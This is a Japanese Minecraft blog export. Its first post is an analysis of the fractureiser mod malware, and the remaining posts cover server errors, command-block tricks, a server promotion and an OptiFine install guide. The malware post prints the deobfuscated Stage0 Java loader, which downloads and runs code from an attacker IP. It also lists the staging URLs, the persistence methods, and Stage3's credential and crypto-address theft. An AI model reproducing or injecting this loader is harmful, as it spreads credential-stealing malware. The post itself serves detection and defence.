[{"content":"はじめに みなさん、お久しぶりです。クリスタと申します。最近話題になっているマルウェア、「fractureiser」についてわかっている範囲でまとめようと思います。\nfractureiserとは fractureiserは、MinecraftのMOD/プラグインをターゲットにしたマルウェアで、2023/06/01に海外のプレイヤーによって発見されました。 そのファイルが、Curse ForgeからダウンロードしたMODから検出されたため、Curse Forgeが直ちに声明を発表しました。 現在は、海外の有志によってこのファイルをソースコードに直す作業がされており、そのソースコードからどのような挙動をするのかが一部解明されています。また、アップロードの日付を確認したところ古くて2023年4月から既に存在していたものとみられています。 このマルウェアは複数のステージで構成されており、各ステージごとに実行される処理が異なるという特徴があります。\nこのマルウェアによる影響 WindowsあるいはLinuxで使用しているほぼすべてのMOD・プラグインに影響が出る恐れがあります。また、Minecraftのクライアント本体、サーバーにも影響が出る恐れが追加で発表されました。直近3週間～1ヵ月の間にCurse Forgeから何らかのMODをダウンロードした場合はマルウェアに感染している可能性が大きいため、後述する検出ツールの使用をおすすめします。\n現時点でMac上での影響は確認されていません。また、Stage3によって感染してマルウェアが実行されてしまった場合はMinecraftとは関連のないすべてのjarファイルに感染を起こす可能性があります。\n・MOD/プラグイン開発者向け\nこのマルウェアにより、Mavenリポジトリへの影響も考えられます。\n現時点でウイルスがアップロードされているサーバーが停止しているため新たな感染はほぼ不可能ですが既存のjarファイルによる活動が続いている可能性があります。\nNote\nここから先は主にデベロッパー(MOD・プラグイン開発者あるいはそれに関連した知識を持つ方)向けの内容になります。検知方法に移動する場合は下のリンクをクリックしてください。\n→検知方法に移動\nマルウェアの活動内容 このマルウェアはStage0からStage3に分かれ、最初はStage0から、最後にマルウェア本体のStage3で構成されています。\nここから先の内容は一つずつ展開して読むことができます。\nStage0\rStage0 Stage0は、Stage3によって感染したjarファイルにあります。Stage3によって感染したjarファイルの中に次のようなコードが記載されています。 また、このコードは難読化されているため一部処理が数字の羅列になっています。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 static void _1685f49242dd46ef9c553d8af1a4e0bb() { Class.forName(new String(new byte[] { // \u0026#34;Utility\u0026#34; 85, 116, 105, 108, 105, 116, 121 }), true, (ClassLoader) Class.forName(new String(new byte[] { // \u0026#34;java.net.URLClassLoader\u0026#34; 106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114 })).getConstructor(URL[].class).newInstance(new URL[] { new URL(new String(new byte[] { // \u0026#34;http\u0026#34; 104, 116, 116, 112 }), new String(new byte[] { // \u0026#34;85.217.144.130\u0026#34; 56, 53, 46, 50, 49, 55, 46, 49, 52, 52, 46, 49, 51, 48 }), 8080, new String(new byte[] { // \u0026#34;/dl\u0026#34; 47, 100, 108 })) })).getMethod(new String(new byte[] { // \u0026#34;run\u0026#34; 114, 117, 110 }), String.class).invoke((Object) null, \u0026#34;-114.-18.38.108.-100\u0026#34;); } Stage0の具体的な処理は次の通りです。\nhttp://[85.217.144.130:8080]/dlに接続して、dl.jarというファイルをダウンロード 1でダウンロードしたファイルを上記コードのUtilityに渡して実行 現在、URL先のページは閉鎖されていますが、URLの差し替えがあったケースもあるようです。\nStage1\rStage1 Stage0でダウンロードされたdl.jarの処理部分です。\nStage0にあるUtility.runがシステムプロパティかどうか確認し、存在する場合は処理を停止し、存在しない場合は空の文字列を設定して続行。 これにより、マルウェアの二重起動がされないようにしている模様です。 また、https://files-8ie.pages.dev/ipにアクセスし、攻撃者が操作するサーバーのIPアドレスを取得します。その後、Stage2のファイルをダウンロードします。(WindowsはlibWebGL64.jar、Linuxlib.jar)\nダウンロードしたファイルをシステム起動時に実行できるようWindowsは、HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Runにレジストリのキーを作成し、Linuxはsystemdでsystemd-utility.serviceというサービスを作成して起動します。\nこれらを要約すると、\nマルウェアが二重起動しないよう確認する https://files-8ie.pages.dev/ipから最新のダウンロードURLを取得し、そこからファイルをダウンロード。ダウンロードしたファイルをシステム起動時に実行されるようにする。 となります。\nStage2\rStage2 Stage2は、Allatori obfuscatorというJavaのソースコードを難読化するツールで難読化されていますが、大体の処理は判明しているようです。\nポート9655を開け、JVM(Java仮想マシン)が閉じたら該当のポートを閉じる .refが存在する場合、ファイルから識別子を読み取る https://[files-8ie.pages.dev]:8083/ipに接続し、Stage3のclient.jarをダウンロードする dev.neko.nekoclient.Client#start(InetAddress, refFileBytes) を呼び出す 現在判明しているSHA:\nSHA1 Detail 52d08736543a240b0cbbbf2da03691ae525bb119 - 6ec85c8112c25abe4a71998eb32480d266408863 D3SL以前のアップロード Stage3\rStage3 Stage3は、ほかのStageに比べて難読処理かつ複雑な処理になっています。ただし、難読処理がされる前のソースが見つかり、それによってどのような挙動をするのかがほぼわかっています。現段階で確認されている挙動は、\nクリップボードの内容を読み取る Microsoft アカウント、Discordなどの認証情報を盗む クリップボード内の暗号通貨アドレスを、攻撃者が所有していると思われる代替アドレスに置き換え すべてのjarファイルに対し、Stage0の処理を挿入しようとする となっています。これによりマルウェア拡大のリスクが大きくなっています。\n検知方法 現時点で、Stage0、Stage1をセキュリティソフトが検知できるように定義ファイルが作成されました。最新版に更新することで見つけることができますが、確実に見つける場合はCurse Forgeの親会社のOverWolfがリリースした検知ツールを使用することでStage3までを検知できます。ただし、確実に検知できるかは不明です。\nCurse Forge 検知ツールのダウンロード リンク先から使っているOSごとのファイルをダウンロードしてください。Windowsの場合は、detection-tool-x-x-x-win.exeを選択します。\nまた、スクリプトファイルをダウンロードあるいはコピーして実行することもできます。\nWindows版(PowerShell)\r次のスクリプトをコピーして`detect.ps1`として保存するか、ダウンロードすることができます。\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $appData = \u0026#34;$HOME\\AppData\u0026#34; $edgePath = \u0026#34;$appData\\Local\\Microsoft Edge\u0026#34; $badPaths = @( \u0026#34;$edgePath\\.ref\u0026#34;, \u0026#34;$edgePath\\client.jar\u0026#34; \u0026#34;$edgePath\\lib.dll\u0026#34;, \u0026#34;$edgePath\\libWebGL64.jar\u0026#34;, \u0026#34;$edgePath\\run.bat\u0026#34;, \u0026#34;$appData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.bat\u0026#34;, \u0026#34;HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\t\u0026#34; ) $res = $false ForEach ($Path in $badPaths) { if (Test-Path -Path $Path) { Write-Host \u0026#34;bad file found! removing $Path...\u0026#34; Remove-Item -Force $Path $res = $true } } if (!($res)) { Write-Host \u0026#34;nothing found! :)\u0026#34; } Read-Host -Prompt \u0026#34;press any button to exit\u0026#34; ファイルをダウンロード\nLinux版(shell)\r次のスクリプトをコピーして`detect.ps1`として保存するか、ダウンロードすることができます。\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 service_file=\u0026#34;systemd-utility\u0026#34; data_dir=\u0026#34;$HOME/.config/.data\u0026#34; bad_paths=( \u0026#34;$data_dir/.ref\u0026#34; \u0026#34;$data_dir/client.jar\u0026#34; \u0026#34;$data_dir/lib.jar\u0026#34; \u0026#34;$HOME/.config/systemd/user/$service_file\u0026#34; \u0026#34;/etc/systemd/system/$service_file\u0026#34; ) res=\u0026#34;true\u0026#34; for path in \u0026#34;${bad_paths[@]}\u0026#34;; do if [ -f \u0026#34;$path\u0026#34; ]; then echo \u0026#34;bad file found! removing $path...\u0026#34; rm --force \u0026#34;$path\u0026#34; res=\u0026#34;false\u0026#34; fi done if [ \u0026#34;$res\u0026#34; == \u0026#34;true\u0026#34; ]; then echo \u0026#34;nothing found :)\u0026#34; fi ファイルをダウンロード\nStage3に感染してしまった場合、ほぼすべてのjarファイルが悪意あるコードに書き換えられる恐れがあります。ただし、現在攻撃者のサーバーがほぼすべてダウンしているため、新たに感染する可能性は低いものの新しくサーバーができる可能性も考えられます。\n対策 Minecraft JE 1.20がリリースされMODを使って楽しみたいという方も少なくないでしょう。ただ、まだStage3の他の機能などわからない部分が多いため、MODサーバー、MODを使ってシングルプレイをやめることをおススメします。特に最近ダウンロードしたMOD・プラグインには注意です。\n最後に このブログは2023/06/08現在の情報です。最新情報を知りたい場合はこのページの最後から移動することができますので参照してください。\n","date":"2023-06-08T00:00:00Z","image":"https://crysta1221.github.io/p/forge_fractureiser/forge_hu74df1d5506317daa3183abe362c784fc_887324_120x120_fill_box_smart1_3.png","permalink":"https://crysta1221.github.io/p/forge_fractureiser/","title":"今話題のfractureiserとは"},{"content":"はじめに お久しぶりです。クリスタです。今回は、「Minecraftにおけるサーバーの接続エラーを解説」する回でございます。 自分がよくいる鯖がアップデートされてサーバーのエラーがここ最近出るようになったのである程度解説しておけば怖くはないかなと思ったのでぜひ最後まで見ていただけると幸いです。\nエラー一覧 Could not connect to a default or fallback server.Incorrectly configured address/port/firewall? このエラーはサーバーが、複数のサーバー間を移動できるプラグイン「BungeeCord」や「Waterfall」を導入していてその設定がミスっている際によく起こります。そのため、クライアント側ではなくサーバー側の問題なので修正されるのを待ちましょう。\njava.net.ConnectException: Connection timed out: no further information このエラーは、Commection timed out サーバーへの接続先が見つからなかった\u0026hellip;ということです。つまり、接続しようとしてたアドレスが存在しないか、サーバーがまだ起動していないことを指しています。nor further informationはこれ以上の情報が見つからなかったことを指しています。\nConnection refused: no further information このエラーは接続しようとしたサーバーが接続を拒否したために発生するエラーです。なぜ拒否されたかはno further informationにより不明です。これはサーバー側のエラーのことが多いです。\nプロフィール公開鍵が失効しています~\u0026hellip; このエラーは接続先のサーバーが1.19以上で発生しやすいです。1.19以降チャットの通報機能が強化されたため署名機能も追加されました。クライアント側のMinecraftとMinecraft Launcherの再起動で直ることが多いです。\nKicked by Whilist これはおなじみホワイトリストに存在しないためキックされたというメッセージですね。ホワイトリストは、管理者しか追加できないのでもしなかったら管理者の人に聞いてみましょう。\nおわりに とりあえず、よく出そうなメッセージだけを解説しました。他にもこのメッセージってどういうこと!?などありましたら、このページの一番最後にコメントを書くことができますので可能な限りスクリーンショットとどうしたらそうなったのかを入れてもらえれば私が時間のある時に答えると思います。それではまた次回お会いしましょう!\n","date":"2023-04-02T00:00:00Z","image":"https://crysta1221.github.io/p/server_err/optifine_hue2d636a5d8422cfb6977f11fd7eaaa67_3002399_120x120_fill_box_smart1_3.png","permalink":"https://crysta1221.github.io/p/server_err/","title":"Minecraftのサーバー接続エラー解説"},{"content":"はじめに お久しぶりです。クリスタです。今回は、「矢がヒットしたプレイヤーを検知」する方法をご紹介したいと思います。 実はもっと早くからこの方法を編み出していたのですが、ローカル環境でデバックした際村人では成功したのに対し、マルチ環境に移行させプレイヤーで試すと コマンドが実行されないということに気づき修正するのにかなりの時間がかかってしまいました\u0026hellip;(ただ、修正でもなぜこれで通ったかは私もわかりません)\n方法とは\u0026hellip; 前回は、効能付き矢tripped_arrowに色を付けて、そのNBTを読み取っていました。今回もある程度似ています。\n今回使うのは、同じく効能付き矢tripped_arrowに今度はプレイヤーに対する効果を付与し、その効果を得たプレイヤーを取得するという方法です。\nどういうこと\u0026hellip;?ってなるかもしれません。つまりは、\n1 2 3 1. 効能付き矢に、前回のColor+effectをつける 2. effectはプレイヤーにヒットした際に/effect と同様の効果をもたらす 3. プレイヤーに付与したeffectをexecuteで検知し、そのプレイヤーに対し、矢をヒットしたことにする という感じです。実際に例を紹介します。こちらは海外のYoutubeを参考にさせていただきました。\nこちらの概要欄にあったコマンドをこちらに表示します。\n1 2 3 4 5 #矢の取得 give @p minecraft:tipped_arrow{CustomPotionEffects:[{Id:27,Amplifier:68,Duration:1,ShowParticles:0b}],CustomPotionColor:16777215} #リピートブロック、無条件、常時実行 execute if entity @e[nbt={HurtTime:10s,ActiveEffects:[{Id:27b,Amplifier:68b}]}] as @e[nbt={HurtTime:10s,ActiveEffects:[{Id:27b,Amplifier:68b}]}] run say 1 シングルワールドで、まず最初に矢を取得し、その後リピートコマンドブロックをgiveで取り出してコマンドを入れます。 その後、取得した矢をオフハンドに持ち、弓で村人に当てると、[村人]1とチャットに表示されます。\nこの時、私は村人検知できたのならプレイヤーも行けるやろ理論でマルチ環境に移行し、知り合いとデバックしたところダメでした\u0026hellip; このコマンドの欠点はプレイヤーでは何もならないということです。では、どうすればプレイヤーも検知できるのか\u0026hellip;\n1 2 #矢の取得 give @p minecraft:tipped_arrow{CustomPotionEffects:[{Id:27,Amplifier:68,Duration:1,ShowParticles:0b}],CustomPotionColor:16777215} を、\n1 2 #矢の取得 give @p minecraft:tipped_arrow{CustomPotionEffects:[{Id:27,Amplifier:68,Duration:2,ShowParticles:0b}],CustomPotionColor:16777215} に、\n1 2 #リピートブロック、無条件、常時実行 execute if entity @e[nbt={HurtTime:10s,ActiveEffects:[{Id:27b,Amplifier:68b}]}] as @e[nbt={HurtTime:10s,ActiveEffects:[{Id:27b,Amplifier:68b}]}] run say 1 を、\n1 2 #リピートブロック、無条件、常時実行 execute if entity @e[nbt={ActiveEffects:[{Id:27b,Amplifier:68b}]}] as @e[nbt={HurtTime:10s,ActiveEffects:[{Id:27b,Amplifier:68b}]}] run say 1 にしてください。何が変わったかというと、HurtTime:10sをなくし、またDuration:を1から2にしました。HurtTime:は傷ついたか判定で用いられるのですが、別になくしても問題なかったです。プレイヤーが検知できなかったのはおそらく、Durationつまりポーションの持続時間が1tickだったため、この1tickを検知できていなかった模様です。2tickにしたところなぜか動きました。なぜ動いたかは\u0026hellip;不明です。(ここのところ有識者頼む\u0026hellip;!)\nおわりに いかがだったでしょうか？今回のこの方法もなかなかに使える場面が多いと思います。ぜひ活用してみてください! 次回の備忘録は未定ですが、そのうち私が引っ掛かったコマンドの罠でも書いておこうかと思います。では次回をお楽しみに!\nTips Tip\nコマンドを実行する前に/(スラッシュ)を必ず入れてください。ただし、データパックは/は必要ありません。\n","date":"2023-02-19T00:18:24+09:00","permalink":"https://crysta1221.github.io/p/23-03-02/","title":"【備忘録】矢がヒットしたプレイヤーを検知"},{"content":"はじめに お久しぶりです。クリスタです。今回は、「弓ごとに別々の効果を発動させる」という方法をご紹介したいと思います。 例えば、炎の弓、氷の弓、雷の弓のように弓を複数使うかつ別々の効果を起こしたい場合、それぞれどの弓から発射されたら炎にするかどうかを調べるのは 大変です。\nそこで今回は海外のサイトで見つけた方法をご紹介したいと思います。\n方法とは\u0026hellip; 具体的にどのようにして区別させるか\u0026hellip;なのですが、今回はクロスボウを使います。なぜクロスボウかというと、クロスボウはコマンドで装填済みの矢を 決めることができます。そして今回はこの装填済みの矢のNBTを調べて区別するというわけです。 今回はクロスボウにminecraft:tripped_arrowを装填させます。このtripped_arrowは何かというと効能付き矢のことです。これはクリエイティブで実際に出すことができます。さらに、この効能付きの矢ですが、NBTにcolorというのがあります。これは効能付き矢の色を決めるものでRGBで決められます。この矢の色でどの効果をもたらすのかを判別します。\nここで一つ難点があります。矢のNBTにはcolorがあるのですが、クロスボウには全く同じものはありません。Minecraftは、クロスボウの装填前の矢と発射後の矢でNBTが変わるという厄介な点があります。\nクロスボウで装填前の矢のNBTは、{CustomPotionColor:255}になりますが、発射されるとこれが、{Color:255}に変化します。\nまずは{CustomPotionColor:255}を設定したクロスボウをgiveで取得します。(このコマンドをコピー後、貼り付ける前に/を入れてください)\n1 give @p crossbow{ChargedProjectiles:[{id:\u0026#34;minecraft:tipped_arrow\u0026#34;,Count:1b,tag:{CustomPotionColor:255}},{},{}],Charged:1b} 1 次にコマンドブロックを用意します。これもgiveで取得します。(このコマンドをコピー後、貼り付ける前に/を入れてください)\n1 give @p command_block コマンドブロックの中は次のコマンドを入れてください。\n1 2 #リピート、常時実行 execute as @e[type=arrow,nbt={Color:255,inGround:1b}] at @s run \u0026lt;実行したい内容\u0026gt; これは、executeで、色が255で地面に着いた矢としてコマンドを実行するものです。\nこれを改造することでこんなこともできます。\n1 2 3 4 5 execute as @e[type=arrow,nbt={Color:255,inGround:1b}] at @s run summon armor_stand ~ ~ ~ {NoGravity:1b,Invulnerable:1b,Invisible:1b,Tags:[\u0026#34;aqua\u0026#34;]} execute as @e[type=armor_stand,tag=aqua] at @s run scoreboard players add @s Aqua 1 execute as @e[type=armor_stand,tag=aqua,scores={Aqua=..1200}] at @s run fill ~ ~1 ~ ~ ~ ~ water keep execute as @e[type=armor_stand,tag=aqua,scores={Aqua=1200..}] at @s unless block ~ ~ ~ iron_bars run fill ~ ~1 ~ ~ ~ ~ air kill @e[type=armor_stand,tag=aqua,scores={Aqua=1200..}] 上のコマンドはすべてデータパックでの活用例です。(一応一行ずつコマブロに移植することもできます)\n1 2 #配布用アイテム give @p crossbow{ChargedProjectiles:[{id:\u0026#34;minecraft:tipped_arrow\u0026#34;,Count:1b,tag:{CustomPotionColor:255}},{},{}],Charged:1b} 1 こちらは実際に動くために必要なクロスボウです。\n実際に使ってみると、着弾地点に水が生成されるようになります。(1分で勝手に消える仕様です)高いところに移動したりするのにすこ～し便利になりました。\nおわりに いかがだったでしょうか？これだけでもいろいろなゲームを作ったりする際に少し便利になるのではないでしょうか\u0026hellip;?\n実はこの{inGround:1b}、プレイヤーにヒットするのは検知できません。そのため、プレイヤーにヒットした場合は何も起こらないのが弱点です。次回はこの解決法もお教えしますのでお楽しみに\u0026hellip;!\nTips Tip\nコマンドを実行する前に/(スラッシュ)を必ず入れてください。ただし、データパックは/は必要ありません。\n","date":"2023-02-18T00:18:24+09:00","permalink":"https://crysta1221.github.io/p/23-02-18/","title":"【備忘録】弓ごとに別々の効果を発動させる"},{"content":"みなさんこんばんは。クリスタです。今回は私がいる畳サーバーというサーバーについて紹介したいと思います!\n畳サーバーについて 畳サーバーは、統合版・Java版・スマホ版どれでも参加できる公開マインクラフトサーバーです。Nintendo Switchでも設定を変更すれば 参加することができます!畳サーバーに入るには畳サーバー公式Discordに参加する必要があります。 Info\nDiscordの利用規約上13歳以上ではないと参加することができません!\n詳しくはコチラから畳サーバー公式ホームページをチェック!\n何をするところ? 畳サーバーではイベントから生活まで様々なコンテンツを用意しています。\n逃走中やPvPで楽しめるイベントサーバー お金の概念がある生活サーバー ミニゲームが楽しめる24時間イベントサーバー 不定期開催!イベントサーバー!\n不定期で開催されるイベントサーバー!逃走中・PvP・鬼ごっこ・マイクラバカ人狼など、いろんなイベントが楽しめます！ しかもどれもクオリティが高くオリジナル要素も含まれているのでハマること間違いなし! ほかにもどんなイベントがあるかはコチラからチェック!\nhttps://tatamiserver.com/event.html\n24時間イベントサーバーでできること\n24時間イベントサーバーと呼ばれ、高難易度イベント「チャレンジタワー」や新感覚弓PvP「Knock Shot」といったミニゲームが楽しめます! ▲チャレンジタワーの様子\n▲Knock Shotのバトルエリア\nチャレンジタワーは一日一回のみ参加可能!(午前3時リセット) KnockShotはいつでも遊べます!\n24時間いつでも遊べる生活サーバー!\n最後に畳サーバーのメインコンテンツの一つ、生活サーバーを紹介! 生活サーバーには土地が空いていればあなただけの土地を確保でき、自由な建築ができます!もちろん、資源ワールドで探検、お金集めもでき、ガチャチケット を買ってレアなアイテムを狙おう! (レアなエンチャント付き武器や装備などがごくまれに手に入るぞ!)\n運営募集中! 畳サーバーでは運営を募集しています。「サーバー運営に携わってみたい!」、「イベントを作りたい!」など、少しでも興味がありましたらコチラからどうぞ！ サーバー運営では生活サーバーを中心に不具合や窃盗などの被害に対応するのが主な仕事です。難しいと思うかもしれませんが慣れると楽しくなりますよ!\nイベントを作ってみたい場合、建築するか・コマンドを作るかどちらかになります。コマンドの場合、データパックというものを主に作っていただくことになります。 プログラミングなんてしたことない\u0026hellip;でも作ってみたい! 安心してください! データパックを学ぶことのできる講座がありますので好きな時間に学ぶことができます!\n最後に 少しでも気になった\u0026hellip;参加してみたい\u0026hellip;!などありましたら、ぜひご参加ください! 心強いマインクラフターがあなたを待っていますよ!\nこれからも不定期で畳サーバーに関する記事を書いていきますのでよければご確認ください! それでは次回の記事でお会いしましょう!\nさようなら!\n","date":"2023-02-12T00:00:00Z","image":"https://crysta1221.github.io/p/tatami-server/contents1_hu97e468769a8c83f5d20714cf8abe3739_1670998_120x120_fill_box_smart1_3.png","permalink":"https://crysta1221.github.io/p/tatami-server/","title":"【Minecraft】畳サーバーとは?"},{"content":"\rNote\nこのブログは、Qiitaから移行されたものです。Qiita版をご覧になりたい場合は、以下のURLよりアクセスしてください。\nhttps://qiita.com/Crysta1221/items/810fa69d8d537054bec1\nはじめに どうもみなさんこんにちは。クリスタです。今回は、「徹底解説! Optifineの導入方法編」ということで、今更ほかのブログでやり方公開されてるのにわざわざ導入方法を書く必要なくね?と思う方も多いはず。 しかし! どのブログも「Optifineの導入に失敗した際の対処法」が少なすぎる!\nなので、今回は導入の解説もしつつ、失敗した際のパターンをほぼすべてに焦点を当てて解説をする回です。では早速行きましょう!\n1. Javaをインストール ということで、まずはOptifineの導入に必須のJavaから入れていきましょう。すでにパソコンにJavaが入っているという方はこの項目をスキップしてください。 今回は以下のページからインストールしていきます。 Javaのホームページ このページにまずはアクセスしましょう。ブラウザは、サポートの切れたInternet Explorer以外なら何でもいいです。下のようなページに飛ぶはずです。 この、赤枠の「Javaをダウンロード」というボタンをクリックしてください。ダウンロードされます。 Chrome系は上の画像のように左下にダウンロードしたファイルが表示されます。 一方、Edgeだけは特殊で、右上あたりにダウンロードするのがあるんですよね\u0026hellip;中身は同じなのにめんどくさいですね。 とりあえずダウンロードできたら、そのファイルをクリックします。エクスプローラーを開かずに、ブラウザでダウンロードしたファイルが表示されているはずなのでそのファイルをクリックすることで簡単に開けます。\nWarning\nここから先は管理者の権限が必要です。\nインストールには、管理者権限が必要です。これは不必要にアプリをインストールできないようにする保護機能なので管理者でログインしている場合は、UAC(ユーザーアカウント制御)という「はい」か「いいえ」で選ぶ画面が出てくるはずです。一方、標準ユーザーの場合はここでパスワードが必要です。もし、親が管理しているパソコンであれば、パスワードが必要になることが多いので許可を取ってパスワードを入れてもらいましょう。 実行するとこんな画面が出てきます。 まずはライセンス条項を読みましょう。これは、Javaの利用規約で、簡単に言うと、\n1 2 3 4 ・このJavaは個人でのみ使えるので商用利用する場合は別のライセンス登録が必要だよ ・このJavaの所有権はOlacleがもってるで ・個人を特定しない形でのデータ提供をOlacleに行なうよ(Javaの最適化につながるよ) ・このJavaについて、サポートは行わないからあくまで自己責任で使ってね という感じです。同意する場合は、「インストール」ボタンを押しましょう。逆に同意しない場合、こっから先には進めないというのは察しがつくと思います。 Javaのインストール完了 という画面が出たら、その画面を閉じましょう。さて、Optifine入れよう!と進めがちですが、一旦パソコンを再起動しましょう。理由は、Javaをインストールした際、そのインストールを必ず適用させるため(つまり失敗しないようにするため)です。中途半端にインストールしてしまうと、Optifineが入らない可能性があります。再起動できたら、次の項目へレッツゴー!\n2. Optifineの導入 さて、今回の山場Optifineの導入に行きます。ここからは完全にパソコンとJavaの相性により、方法が変わります。とりあえず、Optifineをダウンロードしてしまいましょう。以下のページに移動してください。 Optifine公式ページ こんなページになります。 ここから、あなたのバージョンにあったOptifineを入れていくわけですが、今のMinecraftで最新のバージョンは、 1.19.4 です。1.19.4を入れる場合はそのままでよいわけですが、1.19.4より前のバージョンはどこ?と思うかもしれません。そのページに「Show all versions」というリンクがありますのでそれを押しましょう。 そうすると、いろいろなバージョンが表示されるようになります。今回は例として、 1.16.5 で解説しますが、どのバージョンでもやり方は同じですのでやり方としてご覧ください。 目的のバージョンのところに「Download」というボタンがあります。ここをクリックしてください。\nInfo\nこの後のページは広告が表示されます。ですのでこのページに書いてある方法に従ってください。変にクリックするだけで広告のページに飛ばされる恐れがあります。その際は落ちついてその広告ページのタブを閉じれば問題ありません。\n注意にもある通りここから先は広告が表示されます。 私は、Braveという広告をブロックしてくれるブラウザを使っているので真っ白ですが真っ白のところにでかでかと広告が載ってるはずです。どこ押せばいいんや!となりますが、右上に注目。小さく、「Please wait 5 seconds.」と書かれていますね。はい、察しがつくと思いますが、5秒待たないとスキップできません。Youtubeの広告みたいですね。 5秒待つと、右上に「Skip」というボタンが表示されるようになりますのでクリックしましょう。 そうすると、このような画面になりますので今度こそ「Download」ボタンをポチりましょう。 さっきJavaをダウンロードしたみたいにダウンロードしたファイルが表示されます。では、こっからが山場です。相性が良ければ、さっきのようにファイルをクリックすると、 このような画面になります。もし、このような画面になれば、Optifine Installerが表示された場合をご覧ください。それが表示されない場合は、下から該当する現象に合う項目を探してその方法を試してください。該当するものがない場合はまずは、クリックしても反応しない、一瞬黒い画面が出る、プログラムから選択が出るをご覧ください。\nOptifine Installerが表示された場合 成功です! やりましたね! 3.起動構成の変更 に移動して、残りの設定を済ませてしまいましょう。\nクリックしても反応しない、一瞬黒い画面が出る、プログラムから選択が出る 残念ながら、Javaとの相性が良くないようです。JDKを入れてみましょう。今回は、Adopt Open JDKというものを使います。本当は、Olacle のOpen JDKを使ってもいいのですが、Javaのバージョン管理が簡単なAdopt Open JDKがおすすめなのでこちらで。 Adopt Open JDKのページ このページに移動したら、まずは、1. Choose a version という項目があるので、それを一番下の「Open JDK 16(Latest)」にします。「Open JDK 16(Latest)」をクリックすると、選択できます。2はそのままでOKです。 上のようになったら、あとは赤枠のボタンを押してください。 今度はこんなページに飛ばされます。少し下にスクロールして下の画像と同じ場所まで移動してください。 Windowsの場合は、Windows x64 というものを探します。ここではWindowsで説明します。Mac、Linuxの場合も同様に探してください。 Windowsの場合、上の画面まで行けたら、「Msi」というボタンを押してください。Msiというのはインストーラのことで、自動でJavaを入れてくれる便利なものです。ZipはインストールするものでなくJavaをそのままZipにしただけのものです。クリックすると、1.同様にダウンロードされます。またそれをクリックして実行します。 これも管理者権限が必要です。実行すると、以下の画面になります。 Adopt Open JDK 11の画面ですが、16も変わりはありません。「次へ」をクリックします。 まず、Set JAVA_HOME variable を有効にします。×ボタンをクリックして、ローカルハードドライブにインストール をクリックして有効にします。 次に、その下、JavaSoft(Olacle) registory keys も同じようにしてローカルハードドライブにインストールにしてください。その後、「次へ」をクリックし、その後「インストール」をクリックしてください。 これで、Adopt Open JDKがインストールされます。インストール完了と表示されたらまたパソコンを再起動します。再起動後、エクスプローラーを開きます。その後、ダウンロードをクリックします。 その中にある、「Optifine～」で始まるファイルを探します。 見つかったらダブルクリックして開きます。もし、成功していれば、2.Optifineの導入の一番下にある画像のようなものが表示されるはずです。それでもダメな場合、次の項目「Adopt Open JDKでも失敗する」を参照してください。\nAdopt Open JDKでも失敗する場合 今後はコマンドプロンプトを使います。前提として、Javaのインストールが完了していることです。 まずは、WindowsキーあるいはWindowsの画面の左下にあるスタートボタンを押します。その後、cmd と入れると、Windows コマンドプロンプトというのが検索に引っ掛かりますのでそれをクリックするか、「開く」で開いてください。 こんなちょっとかっちょいい画面が出てきましたか? そうしたら、試しにどのように使うかデモンストレーション代わりに以下のコマンドを入れてみましょう。\n1 java -version 入れたら、Enterで実行します。そうすると、Javaのバージョンが表示されるはずです。私の場合、\n1 2 3 openjdk version \u0026#34;16.0.2\u0026#34; 2021-07-20 OpenJDK Runtime Environment Temurin-16.0.2+7 (build 16.0.2+7) OpenJDK 64-Bit Server VM Temurin-16.0.2+7 (build 16.0.2+7, mixed mode, sharing) と表示されます。'java' は、内部コマンドまたは外部コマンド、操作可能なプログラムまたはバッチ ファイルとして認識されていません。 と表示された場合、まずJavaのインストールをしていないか、失敗しているかの2択ですのでインストール/再インストールをしましょう。再インストールは一度Javaをアンインストールしてから再度インストールすることです。もし、Javaのバージョンが表示されたら、次は以下のコマンドを入れましょう。\n1 java -jar これを入れたら、-jarの後にスペースを押してください。その後、Optifineのファイルをコマンドプロンプトの画面にドロップします。どうドロップするか。Optifineのファイルをクリックしたまま、コマンドプロンプトの画面までマウスカーソルを移動させ、コマンドプロンプトの画面のどこかにマウスカーソルが来たら、離します。そうすると全体のコマンドは以下のようになるはずです。\n1 java -jar c:\\Users\\\u0026lt;パソコンのユーザ名\u0026gt;\\Downloads\\Optifine~ .jar こうなってたらOKです。Enterを押してください。そうすると、2.Optifineの導入の一番下のOptifine Installerという画面が出るはずです。 もし、これをやっても無理!という場合はコメント欄に「やったこと」を記述し可能であればスクショを添付していただくと説明します。\nJavaをインストールできません。スイッチに失敗しましたと表示された場合 Javaのインストールが完了していないまま続行したためJarファイルを開けなくなっています。一度コントロールパネルからJavaをアンインストールし、再度インストールしてみてください。\n3. 起動構成の変更 さて、今回の山場は過ぎました。ここで注意し忘れていたのですが、\nWarning\nOptifine Installerを起動する前に、一度マイクラのランチャーからそのバージョンを起動している必要があります。つまり、1.16.5のOptifineを入れる場合は、1.16.5のマイクラを起動している必要があります。\nこういうことです。起動したらもう閉じてOKです。その後、Optifine Installerの「Install」というボタンを押します。 Install Optifine~ successly! みたいに表示されたらOptifineの導入は終わりです。お疲れ様でした。後は、マイクラのランチャーとマイクラの画面を閉じて、ランチャーを起動すると、起動構成にOptifineが追加されています。 さて、終わりでもいいのですが、複数のOptifineを利用する予定の場合は、フォルダ分けをしてしまいましょう。 ランチャーを開き、起動構成に移動します。 こうすると、Optifineの起動の設定ができます。 重要なのはゲームディレクトリです。既定のディレクトリにすると、いちいち起動構成を変更する必要があります。また、リソパの管理、マイクラのバージョン管理も面倒になります。参照ボタンを押すと、 このようになりますので、まずは、Roaming というフォルダをクリックし、「新しいフォルダを作成」ボタンを押して、フォルダを作成します。フォルダの名前はわかりやすいものがいいです。作成したら、作成したフォルダを選択して、「OK」を押します。その後、ゲームディレクトリや名前、バージョンなどの画面になったら「保存」ボタンを押します。これで再度「プレイ」を押すことで今度こそ導入は終わりです。お疲れ様でした!\n4. 終わりに いかがでしたか?無事Optifineは入れられましたでしょうか? 一応失敗する方向けに書かせていただきましたが、もしここに書いてる方法でもうまくいかない場合は、プロフィールのお問い合わせよりお願いします! 